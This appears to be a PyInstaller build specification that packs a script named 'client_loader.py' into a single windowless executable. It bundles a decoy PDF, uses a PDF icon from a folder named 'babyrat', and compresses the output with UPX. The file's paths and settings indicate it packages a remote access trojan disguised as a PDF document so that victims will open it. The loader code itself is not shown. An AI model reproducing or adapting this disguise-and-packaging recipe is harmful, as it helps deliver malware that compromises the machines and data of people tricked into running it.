# -*- mode: python ; coding: utf-8 -*-
a = Analysis(
    ['client_loader.py'],
    pathex=[],
    binaries=[],
    datas=[('C:\\Users\\bense\\Downloads\\Chapter 2 PP&E.pdf', '.')],
    hiddenimports=[
        'pkg_resources', 'email', 'email.mime', 'email.mime.text', 
        'email.mime.base', 'email.mime.multipart', 'email.utils', 
        'email.parser', 'email.message', 'asyncio', 'websockets', 'Crypto'
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=2,
)
pyz = PYZ(a.pure)
exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='finally',
    debug=False,
    bootloader_ignore_signals=False,
    strip=True,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    onefile=True,
    disable_windowed_traceback=True,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    
    icon=[r'C:\Users\bense\Desktop\babyrat\babyrat-main\pdflogo.ico'],
)
